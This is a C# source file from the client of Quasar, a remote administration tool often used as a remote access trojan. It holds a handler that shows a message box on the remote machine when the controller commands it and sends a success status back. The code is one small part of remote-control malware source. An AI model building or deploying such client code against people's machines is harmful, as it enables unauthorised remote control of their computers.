using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class MessageBoxHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShowMessageBox;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShowMessageBox msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoShowMessageBox message)
        {
            new Thread(() =>
            {
                // messagebox thread resides in csrss.exe - wtf?
                MessageBox.Show(message.Text, message.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), message.Button),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), message.Icon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            }) {IsBackground = true}.Start();

            client.Send(new SetStatus { Message = "Successfully displayed MessageBox" });
        }
    }
}
